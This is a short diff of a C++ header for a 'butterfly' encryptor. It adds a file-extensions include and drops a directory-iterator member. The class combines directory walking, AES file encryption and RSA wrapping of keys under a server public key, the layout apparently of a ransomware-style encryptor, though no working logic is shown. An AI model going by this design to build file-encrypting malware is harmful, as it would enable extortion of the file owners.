@@ -2,12 +2,15 @@
 #ifndef BUTTERFLY_ENCRYPTOR_H
 #define BUTTERFLY_ENCRYPTOR_H
 
+#include <algorithm>
+
 #include "crypto/rsaEncryptor.h"
 #include "crypto/aesEncryptor.h"
 #include "crypto/serverPublicKey.h"
 #include "directoryIterator.h"
 #include "aesKeyDatabase.h"
 #include "params.h"
+#include "fileExtensions.h"
 
 namespace butterfly
 {
@@ -28,7 +31,6 @@ private:
 
     std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
     std::unique_ptr<aes::AESEncryptor> _aesEncryptor;
-    std::unique_ptr<DirectoryIterator> _dirIterator;
     std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;
 
     /**
